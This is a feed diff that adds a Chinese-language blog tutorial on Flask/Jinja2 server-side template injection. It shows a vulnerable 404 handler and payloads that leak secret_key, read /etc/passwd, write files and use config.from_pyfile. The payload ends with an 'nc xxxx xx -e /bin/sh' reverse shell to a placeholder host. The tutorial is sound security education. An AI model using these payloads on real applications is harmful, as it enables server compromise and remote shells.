@@ -127,13 +127,90 @@
   </entry>
   
   <entry>
-    <title></title>
+    <title>Flask/Jinja 模板注入</title>
     <link href="http://klaus.link/2017/Flask_SSTI/"/>
     <id>http://klaus.link/2017/Flask_SSTI/</id>
     <published>2017-04-05T18:27:50.000Z</published>
-    <updated>2018-05-18T18:19:46.916Z</updated>
+    <updated>2018-05-27T18:49:17.755Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>最近看了国外几篇关于模板注入的文章, 自己也在这里加上自己的一些东西总结一下.  </p>
+<blockquote>
+<p><a href="http://blog.portswigger.net/2015/08/server-side-template-injection.html" target="_blank" rel="external">Server-Side Template Injection</a> — <a href="https://twitter.com/albinowax" target="_blank" rel="external">James Kettle</a></p>
+<p><a href="http://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/" target="_blank" rel="external">Exploring SSTI in Flask/Jinja2</a> —  <a href="https://nvisium.com/about#TimTomes" target="_blank" rel="external">Tim Tomes</a></p>
+<p><a href="https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/" target="_blank" rel="external">Exploring SSTI in Flask/Jinja2, Part II</a> — <a href="https://nvisium.com/about#TimTomes" target="_blank" rel="external">Tim Tomes</a></p>
+</blockquote>
+<h1 id="0x01-万恶的拼接"><a href="#0x01-万恶的拼接" class="headerlink" title="0x01 万恶的拼接"></a>0x01 万恶的拼接</h1><p>我们先看这段处理网站404状态的代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@app.errorhandler(404)</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(e)</span>:</span></div><div class="line">    template = <span class="string">'''</span></div><div class="line">&#123;%% block body %%&#125;</div><div class="line">    &lt;div class="center-content error"&gt;</div><div class="line">        &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt;</div><div class="line">        &lt;h3&gt;%s&lt;/h3&gt;</div><div class="line">    &lt;/div&gt; </div><div class="line">&#123;%% endblock %%&#125;</div><div class="line">''' % (request.url)</div><div class="line">    <span class="keyword">return</span> render_template_string(template), <span class="number">404</span></div></pre></td></tr></table></figure>
+<p>这段代码没有从模板文件而是用 render_template_string() 直接从一个字符串渲染到了html. 从模板文件还是从字符串倒不是什么大问题, 主要是它渲染的那个字符串是和用户的输入(request.url)拼接过的. 要知道这里的 template 存的并不是纯数据而是有一部分控制功能在里面的. 这就产生了代码域与数据域的混淆, 只要出现了这样的情况十有八九就会有洞. 首先最直接的, html模板渲染到html, 插入到html就肯定会有XSS.</p>
+<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149609702857674.png" alt="20170530149609702857674.png"></p>
+<h1 id="0x02-不仅仅是客户端"><a href="#0x02-不仅仅是客户端" class="headerlink" title="0x02 不仅仅是客户端"></a>0x02 不仅仅是客户端</h1><p>我们都知道html里面拼接数据是XSS攻击的是客户端, 然而html模板并不仅仅是html, 还有能被模板渲染引擎解释的模板代码, 这样一来我们就能插入在服务器端执行的代码. 让我们试一下</p>
+<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149609767354923.png" alt="20170530149609767354923.png"></p>
+<p>看来是可以的, 再试一个 <code></code> </p>
+<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149609777784600.png" alt="20170530149609777784600.png"></p>
+<p>WOW, 连secret_key都爆出来了(还记得hitcon有个题就是这个套路)</p>
+<h1 id="0x03-读写文件"><a href="#0x03-读写文件" class="headerlink" title="0x03 读写文件"></a>0x03 读写文件</h1><p>当然, 我们的目标肯定不能止步于一个 <code></code> 泄露出来的信息. 我们想的当然是最好能拿到一个shell.</p>
+<p>要拿到shell, 就很难避免要执行命令, 而Jinja和Flask的template是不太可能提供这种功能的(事实上也没有), 所以在这种环境下, 肯定就要想办法调用python的 <code>system()</code> 或者 <code>check_output()</code> 之类可以执行命令的函数.</p>
+<p>首先在Flask/Jinja的模板中, python的字符串,数字这类基本对象是肯定是支持的</p>
+<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149610443015120.png" alt="20170530149610443015120.png"></p>
+<p>其实根据以前在CTF里面的经验, 不难想到先试着调用一下这些对象的内置方法, 去看一下当前环境下能访问哪些对象 <code>&#39;&#39;.__class__.__mro__[2].__subclasses__()</code> , 或者 <code>(1).__class__.__base__.__subclasses__()</code></p>
+<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149613100464149.png" alt="20170530149613100464149.png"></p>
+<p>这里还是稍微写一下, 首先 <code>&#39;&#39;.__class__</code> 可以访问到字符串的类型对象(关于python中的类型对象参见<a href="http://www.cafepy.com/article/python_types_and_objects/python_types_and_objects.html" target="_blank" rel="external">Python Types and Objects</a>)</p>
+<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149613122259818.png" alt="20170530149613122259818.png"></p>
+<p>因为python中所有的对象都是从Object逐级继承来的, 类型对象也不除外, 所有我们就可以调用对象的 <code>__base__</code> 方法访问该对象所继承的对象</p>
+<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149613167899580.png" alt="20170530149613167899580.png"></p>
+<p>或者使用 <code>__mro__</code>(Method Resolution Order) 直接获得对象的继承链, python用这个方法来确定对象方法解析的顺序</p>
+<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149613202779829.png" alt="20170530149613202779829.png"></p>
+<p>当我们访问到Object的类型对象的时候, 就可以用 <code>__subclasses__()</code>来获得当前环境下能够访问的所有对象.</p>
+<p>因为调用对象的 <code>__subclasses__()</code> 方法会返回当前环境中所有继承于该对象的对象. </p>
+<p>我们仔细过一遍环境里面存在的对象, 首先引起我们注意的肯定就是这个python内建的file对象</p>
+<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149614817497351.png" alt="20170530149614817497351.png"></p>
+<p>至少我们能读写文件了. </p>
+<p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/etc/passwd&#39;, &#39;r&#39;).read()</code></p>
+<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149614845235931.png" alt="20170530149614845235931.png"></p>
+<p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/tmp/test&#39;, &#39;w&#39;).write(&#39;AAAAAAAAAAAAAAAAAA&#39;)</code></p>
+<p><img src="http://ony7wielg.bkt.clouddn.com/2017053014961485844412.png" alt="2017053014961485844412.png"></p>
+<p>但是即使可以写文件, 好像也拿不到shell, 因为这又不像是PHP, 文件或者说代码的执行我们是很难控制的.</p>
+<p>那么就再看看别的对象, 看了一圈好像确实找不到能让我们离命令执行更进一步的对象了, 看来单纯用这种方式很难拿到shell了</p>
+<h1 id="0x04-沙盒逃逸"><a href="#0x04-沙盒逃逸" class="headerlink" title="0x04 沙盒逃逸"></a>0x04 沙盒逃逸</h1><p>卡住了以后就按照James大佬的思路, 在我们判断出存在SSTI之后, 下一步要做的就是<strong>仔细阅读文档</strong>, 挖掘一下在当前的环境下有哪些可以利用的点</p>
+<blockquote>
+<ul>
+<li>‘For Template Authors’ sections covering basic syntax.</li>
+<li>‘Security Considerations’ - chances are whoever developed the app you’re testing didn’t read this, and it may contain some useful hints.</li>
+<li>Lists of builtin methods, functions, filters, and variables.</li>
+<li>Lists of extensions/plugins - some may be enabled by default.</li>
+</ul>
+</blockquote>
+<p>在阅读Flask和Jinja的文档的时候, 要仔细翻的就两个部分</p>
+<blockquote>
+<ul>
+<li><a href="http://jinja.pocoo.org/docs/dev/templates/#builtin-globals" target="_blank" rel="external">Jinja globals</a></li>
+<li><a href="http://flask.pocoo.org/docs/0.10/templating/#standard-context" target="_blank" rel="external">Flask template globals</a></li>
+</ul>
+</blockquote>
+<p>仔细翻阅之后, 我们在Flask的config对象上找到了突破点, 查看文档发现config对象有一个<a href="http://flask.pocoo.org/docs/0.12/api/#flask.Config.from_pyfile" target="_blank" rel="external">from_pyfile()</a>的方法用于从.py文件中读取配置到config中. 我们去flask的源代码里仔细看一看这个函数的行为</p>
+<p>config.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">from_pyfile</span><span class="params">(self, filename, silent=False)</span>:</span></div><div class="line">    <span class="string">"""Updates the values in the config from a Python file.  This function</span></div><div class="line">    behaves as if the file was imported as module with the</div><div class="line">    :meth:`from_object` function.</div><div class="line"></div><div class="line">    :param filename: the filename of the config.  This can either be an</div><div class="line">                     absolute filename or a filename relative to the</div><div class="line">                     root path.</div><div class="line">    :param silent: set to ``True`` if you want silent failure for missing</div><div class="line">                   files.</div><div class="line"></div><div class="line">    .. versionadded:: 0.7</div><div class="line">       `silent` parameter.</div><div class="line">    """</div><div class="line">    filename = os.path.join(self.root_path, filename)</div><div class="line">    d = types.ModuleType(<span class="string">'config'</span>)</div><div class="line">    d.__file__ = filename</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">with</span> open(filename) <span class="keyword">as</span> config_file:</div><div class="line">            exec(compile(config_file.read(), filename, <span class="string">'exec'</span>), d.__dict__)</div><div class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</div><div class="line">        <span class="keyword">if</span> silent <span class="keyword">and</span> e.errno <span class="keyword">in</span> (errno.ENOENT, errno.EISDIR):</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        e.strerror = <span class="string">'Unable to load configuration file (%s)'</span> % e.strerror</div><div class="line">        <span class="keyword">raise</span></div><div class="line">    self.from_object(d)</div><div class="line">    <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">from_object</span><span class="params">(self, obj)</span>:</span></div><div class="line">    <span class="string">"""Updates the values from the given object.  An object can be of one</span></div><div class="line">    of the following two types:</div><div class="line"></div><div class="line">    -   a string: in this case the object with that name will be imported</div><div class="line">    -   an actual object reference: that object is used directly</div><div class="line"></div><div class="line">    Objects are usually either modules or classes.</div><div class="line"></div><div class="line">    Just the uppercase variables in that object are stored in the config.</div><div class="line">    Example usage::</div><div class="line"></div><div class="line">        app.config.from_object('yourapplication.default_config')</div><div class="line">        from yourapplication import default_config</div><div class="line">        app.config.from_object(default_config)</div><div class="line"></div><div class="line">    You should not use this function to load the actual configuration but</div><div class="line">    rather configuration defaults.  The actual config should be loaded</div><div class="line">    with :meth:`from_pyfile` and ideally from a location not within the</div><div class="line">    package because the package might be installed system wide.</div><div class="line"></div><div class="line">    :param obj: an import name or object</div><div class="line">    """</div><div class="line">    <span class="keyword">if</span> isinstance(obj, string_types):</div><div class="line">        obj = import_string(obj)</div><div class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> dir(obj):</div><div class="line">        <span class="keyword">if</span> key.isupper():</div><div class="line">            self[key] = getattr(obj, key)</div></pre></td></tr></table></figure>
+<p>flask有 <code>from_json</code>, <code>from_envvar</code>, <code>from_object</code>, <code>from_mapping</code>, <code>from_pyfile</code> 等好几个更新配置的方法, 但是相比于其它 <code>from_pyfile</code> 这个方法的实现有点特殊. 我们看上面的源码, 首先新建一个module对象d, 然后把传入的文件读出来用compile()编译成exec()可以执行的code对象,  然后执行, <strong>并且把 <code>d.__dict__</code> 用作代码对象code执行的scope</strong>. 这句话可能比较抽象, 或者我说的不准确, 这里放一张调试的图, 相信大家一看就明白了</p>
+<p><img src="http://ony7wielg.bkt.clouddn.com/2017053114961670666146.png" alt="2017053114961670666146.png"></p>
+<p>然后又将d传入了 <code>from_object</code> 方法, <code>from_object</code> 方法遍历 <code>d.__dict__</code> 将键名为大写的键值对更新到当前环境的config对象中.</p>
+<p>所以如果我们能让 <code>from_pyfile</code> 去读这样的一个文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</div><div class="line">SHELL = system</div></pre></td></tr></table></figure>
+<p>那么我们访问 <code>config[&#39;SHELL&#39;]</code> 时, 实际上就能访问到 <code>system</code> 函数了. 而我们前面又已经做到了文件读写, 所以两个点结合起来我们就完全可以拿到SHELL</p>
+<p><img src="http://ony7wielg.bkt.clouddn.com/20170531149616851775623.png" alt="20170531149616851775623.png"></p>
+<p><img src="http://ony7wielg.bkt.clouddn.com/20170531149616854020117.png" alt="20170531149616854020117.png"></p>
+<p>我们最终的payload为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&#123;&#123; <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/evil'</span>, <span class="string">'w'</span>).write(<span class="string">'from os import system%0aSHELL = system'</span>) &#125;&#125;</div><div class="line">//写文件</div><div class="line">&#123;&#123; config.from_pyfile(<span class="string">'/tmp/evil'</span>) &#125;&#125;</div><div class="line">//加载system</div><div class="line">&#123;&#123; config[<span class="string">'SHELL'</span>](<span class="string">'nc xxxx xx -e /bin/sh'</span>) &#125;&#125;</div><div class="line">//执行命令反弹SHELL</div></pre></td></tr></table></figure>
+<h1 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h1><p><a href="http://www.cafepy.com/article/python_types_and_objects/python_types_and_objects.html" target="_blank" rel="external">http://www.cafepy.com/article/python_types_and_objects/python_types_and_objects.html</a></p>
+<p><a href="http://flask.pocoo.org/docs/0.12/api/#flask.Config.from_pyfile" target="_blank" rel="external">http://flask.pocoo.org/docs/0.12/api/#flask.Config.from_pyfile</a></p>
+<p><a href="https://docs.python.org/3/library/types.html" target="_blank" rel="external">https://docs.python.org/3/library/types.html</a></p>
+<p><a href="https://docs.python.org/3/library/functions.html#exec" target="_blank" rel="external">https://docs.python.org/3/library/functions.html#exec</a></p>
+]]></content>
     
     <summary type="html">
+    
+      &lt;h1 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h1&gt;&lt;p&gt;最近看了国外几篇关于模板注入的文章, 自己也在这里加上自己的一些东西总结一下.  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;
     
     </summary>
     
